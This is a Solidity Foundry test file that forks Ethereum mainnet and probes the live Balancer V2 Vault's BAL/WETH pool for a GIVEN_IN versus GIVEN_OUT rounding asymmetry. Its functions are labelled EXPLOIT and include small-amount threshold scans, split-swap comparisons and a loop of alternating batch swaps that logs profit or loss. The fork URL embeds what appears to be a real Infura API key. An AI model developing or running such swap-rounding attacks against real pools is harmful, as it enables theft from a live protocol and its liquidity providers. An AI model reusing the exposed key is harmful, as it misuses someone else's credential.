// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// Refined Rounding Exploit for Balancer V2
// Exploiting the GIVEN_IN vs GIVEN_OUT rounding asymmetry
// ============================================================================

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds, int256[] memory limits, uint256 deadline) external payable returns (int256[] memory);
    function queryBatchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds) external returns (int256[] memory);
}

contract BalancerRoundingExploit is Test {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);

    bytes32 constant BAL_WETH_POOL = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);
        vm.deal(attacker, 1000 ether);
        WETH.deposit{value: 500 ether}();
        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);
    }

    // ========================================================================
    // EXPLOIT: Reverse direction - Start with BAL, exploit rounding
    // ========================================================================
    function test_ReverseDirectionExploit() public {
        console.log("=== REVERSE DIRECTION ROUNDING EXPLOIT ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // First get some BAL
        uint256 initialWeth = 10 ether;
        IVault.BatchSwapStep[] memory buyBal = new IVault.BatchSwapStep[](1);
        buyBal[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: initialWeth,
            userData: ""
        });

        int256[] memory limits = new int256[](2);
        limits[0] = 0;
        limits[1] = int256(initialWeth);

        VAULT.batchSwap(IVault.SwapKind.GIVEN_IN, buyBal, assets, funds, limits, block.timestamp + 1000);

        uint256 balBalance = BAL.balanceOf(attacker);
        uint256 wethBalance = WETH.balanceOf(attacker);
        console.log("After initial buy:");
        console.log("  BAL:", balBalance);
        console.log("  WETH:", wethBalance);

        // Now test: GIVEN_OUT vs GIVEN_IN for getting WETH
        uint256 targetWeth = 1 ether;

        // Option A: GIVEN_OUT - Specify WETH out, see BAL needed
        IVault.BatchSwapStep[] memory swapOut = new IVault.BatchSwapStep[](1);
        swapOut[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: targetWeth,
            userData: ""
        });

        int256[] memory deltasOut = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_OUT, swapOut, assets, funds);
        uint256 balNeededOut = uint256(deltasOut[0]);
        console.log("\nGIVEN_OUT to get 1 WETH:");
        console.log("  BAL needed:", balNeededOut);

        // Option B: GIVEN_IN - Use that BAL amount, see how much WETH we get
        IVault.BatchSwapStep[] memory swapIn = new IVault.BatchSwapStep[](1);
        swapIn[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: balNeededOut,
            userData: ""
        });

        int256[] memory deltasIn = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swapIn, assets, funds);
        uint256 wethReceivedIn = uint256(-deltasIn[1]);
        console.log("\nGIVEN_IN with same BAL amount:");
        console.log("  WETH received:", wethReceivedIn);

        // Check the difference
        if (wethReceivedIn > targetWeth) {
            console.log("\n=== PROFIT: GIVEN_IN gives MORE WETH ===");
            console.log("  Profit (wei):", wethReceivedIn - targetWeth);
        } else if (wethReceivedIn < targetWeth) {
            console.log("\n=== LOSS: GIVEN_IN gives LESS WETH ===");
            console.log("  Loss (wei):", targetWeth - wethReceivedIn);
        } else {
            console.log("\n=== NO DIFFERENCE ===");
        }
    }

    // ========================================================================
    // EXPLOIT: Many small swaps exploit rounding accumulation
    // ========================================================================
    function test_ManySmallSwapsRounding() public {
        console.log("=== MANY SMALL SWAPS ROUNDING ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Test amounts near the zero-output threshold
        uint256[] memory amounts = new uint256[](10);
        amounts[0] = 30000000;  // Just above threshold
        amounts[1] = 50000000;
        amounts[2] = 100000000;
        amounts[3] = 500000000;
        amounts[4] = 1e9;       // 1 gwei
        amounts[5] = 10e9;      // 10 gwei
        amounts[6] = 100e9;     // 100 gwei
        amounts[7] = 1000e9;    // 1000 gwei
        amounts[8] = 10000e9;   // 10000 gwei
        amounts[9] = 100000e9;  // 0.0001 ETH

        for (uint i = 0; i < amounts.length; i++) {
            uint256 amt = amounts[i];

            // Single swap
            IVault.BatchSwapStep[] memory single = new IVault.BatchSwapStep[](1);
            single[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: amt,
                userData: ""
            });

            int256[] memory singleDelta = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, single, assets, funds);
            uint256 singleOut = uint256(-singleDelta[0]);

            // 10 swaps of 1/10th
            uint256 smallAmt = amt / 10;
            uint256 accumulatedOut = 0;

            if (smallAmt > 0) {
                IVault.BatchSwapStep[] memory multi = new IVault.BatchSwapStep[](10);
                for (uint j = 0; j < 10; j++) {
                    multi[j] = IVault.BatchSwapStep({
                        poolId: BAL_WETH_POOL,
                        assetInIndex: 1,
                        assetOutIndex: 0,
                        amount: smallAmt,
                        userData: ""
                    });
                }

                try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, multi, assets, funds) returns (int256[] memory multiDelta) {
                    accumulatedOut = uint256(-multiDelta[0]);
                } catch {
                    accumulatedOut = 0;
                }
            }

            console.log("\n--- Amount:", amt, "---");
            console.log("Single swap BAL:", singleOut);
            console.log("10x small swaps BAL:", accumulatedOut);

            if (singleOut > accumulatedOut) {
                console.log("Single is better by:", singleOut - accumulatedOut);
            } else if (accumulatedOut > singleOut) {
                console.log("Multi is better by:", accumulatedOut - singleOut);
            }
        }
    }

    // ========================================================================
    // EXPLOIT: Test minimum profitable operation
    // ========================================================================
    function test_MinimumProfitableOperation() public {
        console.log("=== MINIMUM PROFITABLE OPERATION ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Test the GIVEN_IN vs GIVEN_OUT at various small amounts
        // Looking for where the ~20 gwei profit potential exists

        console.log("Testing GIVEN_IN/GIVEN_OUT difference at small amounts:");
        console.log("(WETH in, BAL out GIVEN_IN, WETH needed GIVEN_OUT, Profit wei)");

        uint256[] memory testAmounts = new uint256[](15);
        testAmounts[0] = 1e8;      // 0.1 gwei
        testAmounts[1] = 5e8;      // 0.5 gwei
        testAmounts[2] = 1e9;      // 1 gwei
        testAmounts[3] = 2e9;      // 2 gwei
        testAmounts[4] = 5e9;      // 5 gwei
        testAmounts[5] = 1e10;     // 10 gwei
        testAmounts[6] = 2e10;     // 20 gwei
        testAmounts[7] = 5e10;     // 50 gwei
        testAmounts[8] = 1e11;     // 100 gwei
        testAmounts[9] = 2e11;     // 200 gwei
        testAmounts[10] = 5e11;    // 500 gwei
        testAmounts[11] = 1e12;    // 1000 gwei
        testAmounts[12] = 1e13;    // 10000 gwei
        testAmounts[13] = 1e14;    // 0.0001 ETH
        testAmounts[14] = 1e15;    // 0.001 ETH

        for (uint i = 0; i < testAmounts.length; i++) {
            uint256 wethIn = testAmounts[i];

            // GIVEN_IN: wethIn -> balOut
            IVault.BatchSwapStep[] memory swapIn = new IVault.BatchSwapStep[](1);
            swapIn[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: wethIn,
                userData: ""
            });

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swapIn, assets, funds) returns (int256[] memory dIn) {
                uint256 balOut = uint256(-dIn[0]);

                if (balOut > 0) {
                    // GIVEN_OUT: How much WETH to get balOut BAL?
                    IVault.BatchSwapStep[] memory swapOut = new IVault.BatchSwapStep[](1);
                    swapOut[0] = IVault.BatchSwapStep({
                        poolId: BAL_WETH_POOL,
                        assetInIndex: 1,
                        assetOutIndex: 0,
                        amount: balOut,
                        userData: ""
                    });

                    try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_OUT, swapOut, assets, funds) returns (int256[] memory dOut) {
                        uint256 wethNeeded = uint256(dOut[1]);

                        console.log("WETH in:", wethIn);
                        console.log("  BAL out:", balOut);
                        console.log("  WETH for same BAL (GIVEN_OUT):", wethNeeded);

                        if (wethIn > wethNeeded) {
                            console.log("  PROFIT:", wethIn - wethNeeded);
                        } else {
                            console.log("  LOSS:", wethNeeded - wethIn);
                        }
                    } catch {
                        console.log("WETH in:", wethIn);
                        console.log("  GIVEN_OUT query failed");
                    }
                } else {
                    console.log("WETH in:", wethIn);
                    console.log("  BAL out: 0 (below threshold)");
                }
            } catch {
                console.log("WETH in:", wethIn);
                console.log("  GIVEN_IN query failed");
            }
        }
    }

    // ========================================================================
    // EXPLOIT: Batch alternating direction exploit
    // ========================================================================
    function test_BatchAlternatingExploit() public {
        console.log("=== BATCH ALTERNATING DIRECTION EXPLOIT ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // First get some BAL
        console.log("Step 1: Acquire BAL tokens");
        IVault.BatchSwapStep[] memory buyBal = new IVault.BatchSwapStep[](1);
        buyBal[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: 50 ether,
            userData: ""
        });

        int256[] memory limits = new int256[](2);
        limits[0] = 0;
        limits[1] = int256(50 ether);

        VAULT.batchSwap(IVault.SwapKind.GIVEN_IN, buyBal, assets, funds, limits, block.timestamp + 1000);

        uint256 balBefore = BAL.balanceOf(attacker);
        uint256 wethBefore = WETH.balanceOf(attacker);
        console.log("  BAL:", balBefore / 1e18);
        console.log("  WETH:", wethBefore / 1e18);

        // Strategy: Use GIVEN_OUT to specify exact WETH amounts, exploiting rounding
        console.log("\nStep 2: Execute alternating swaps");

        uint256 swapSize = 1 ether;
        uint256 iterations = 20;

        for (uint i = 0; i < iterations; i++) {
            // GIVEN_OUT: I want exactly swapSize WETH, spend BAL
            IVault.BatchSwapStep[] memory toWeth = new IVault.BatchSwapStep[](1);
            toWeth[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: swapSize,
                userData: ""
            });

            int256[] memory limitsToWeth = new int256[](2);
            limitsToWeth[0] = int256(BAL.balanceOf(attacker));
            limitsToWeth[1] = 0;

            try VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, toWeth, assets, funds, limitsToWeth, block.timestamp + 1000) {
                // Now swap back: GIVEN_IN the WETH we just got
                IVault.BatchSwapStep[] memory toBal = new IVault.BatchSwapStep[](1);
                toBal[0] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 1,
                    assetOutIndex: 0,
                    amount: swapSize,
                    userData: ""
                });

                int256[] memory limitsToBal = new int256[](2);
                limitsToBal[0] = 0;
                limitsToBal[1] = int256(swapSize);

                VAULT.batchSwap(IVault.SwapKind.GIVEN_IN, toBal, assets, funds, limitsToBal, block.timestamp + 1000);

                if (i % 5 == 0) {
                    console.log("  Iteration:", i);
                    console.log("    BAL:", BAL.balanceOf(attacker) / 1e18);
                }
            } catch {
                console.log("  Failed at iteration:", i);
                break;
            }
        }

        uint256 balAfter = BAL.balanceOf(attacker);
        uint256 wethAfter = WETH.balanceOf(attacker);

        console.log("\nFinal State:");
        console.log("  BAL:", balAfter / 1e18);
        console.log("  WETH:", wethAfter / 1e18);

        if (balAfter > balBefore) {
            console.log("  BAL PROFIT:", (balAfter - balBefore) / 1e18);
        } else {
            console.log("  BAL LOSS:", (balBefore - balAfter) / 1e18);
        }

        if (wethAfter > wethBefore) {
            console.log("  WETH PROFIT:", (wethAfter - wethBefore) / 1e18);
        } else {
            console.log("  WETH LOSS:", (wethBefore - wethAfter) / 1e18);
        }
    }

    // ========================================================================
    // EXPLOIT: Massive batch with different SwapKinds
    // ========================================================================
    function test_MassiveMixedBatch() public {
        console.log("=== MASSIVE MIXED SWAPKIND BATCH ===");

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Test: What if we do 100 GIVEN_IN swaps vs 100 GIVEN_OUT swaps?
        uint256 totalWeth = 10 ether;
        uint256 numSwaps = 100;
        uint256 amtPerSwap = totalWeth / numSwaps;

        // 100 GIVEN_IN swaps
        IVault.BatchSwapStep[] memory givenInSwaps = new IVault.BatchSwapStep[](numSwaps);
        for (uint i = 0; i < numSwaps; i++) {
            givenInSwaps[i] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: amtPerSwap,
                userData: ""
            });
        }

        int256[] memory givenInDelta = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, givenInSwaps, assets, funds);
        uint256 balFromGivenIn = uint256(-givenInDelta[0]);
        uint256 wethSpentGivenIn = uint256(givenInDelta[1]);

        console.log("100 GIVEN_IN swaps of 0.1 ETH each:");
        console.log("  WETH spent:", wethSpentGivenIn / 1e18);
        console.log("  BAL received:", balFromGivenIn);

        // 100 GIVEN_OUT swaps (targeting same BAL amount divided by 100)
        uint256 balPerSwap = balFromGivenIn / numSwaps;

        IVault.BatchSwapStep[] memory givenOutSwaps = new IVault.BatchSwapStep[](numSwaps);
        for (uint i = 0; i < numSwaps; i++) {
            givenOutSwaps[i] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: balPerSwap,
                userData: ""
            });
        }

        int256[] memory givenOutDelta = VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_OUT, givenOutSwaps, assets, funds);
        uint256 wethNeededGivenOut = uint256(givenOutDelta[1]);
        uint256 balReceivedGivenOut = balPerSwap * numSwaps;

        console.log("\n100 GIVEN_OUT swaps targeting same BAL per swap:");
        console.log("  BAL targeted:", balReceivedGivenOut);
        console.log("  WETH needed:", wethNeededGivenOut / 1e18);

        // Compare
        console.log("\nComparison:");
        console.log("  GIVEN_IN: ", wethSpentGivenIn);
        console.log("  GIVEN_OUT:", wethNeededGivenOut);

        if (wethSpentGivenIn > wethNeededGivenOut) {
            console.log("  GIVEN_OUT is CHEAPER by:", wethSpentGivenIn - wethNeededGivenOut, "wei");
        } else if (wethNeededGivenOut > wethSpentGivenIn) {
            console.log("  GIVEN_IN is CHEAPER by:", wethNeededGivenOut - wethSpentGivenIn, "wei");
        }
    }

    receive() external payable {}
}
